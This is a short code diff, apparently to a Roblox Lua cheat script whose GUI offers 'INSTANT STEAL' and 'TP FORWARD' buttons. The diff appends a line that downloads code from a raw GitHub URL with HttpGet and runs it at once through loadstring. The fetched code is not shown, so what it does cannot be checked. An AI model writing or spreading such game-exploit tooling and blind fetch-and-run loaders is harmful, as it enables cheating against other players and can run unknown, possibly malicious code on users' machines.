@@ -173,3 +173,5 @@ end
 makeBtn("INSTANT STEAL", 50, Color3.fromRGB(220,60,60))
 makeBtn("TP FORWARD", 90, Color3.fromRGB(90,150,255))
 makeBtn("FAST STEAL: OFF", 130, Color3.fromRGB(120,120,140))
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Zzzz-Hub20/jdjd/refs/heads/main/jd"))()
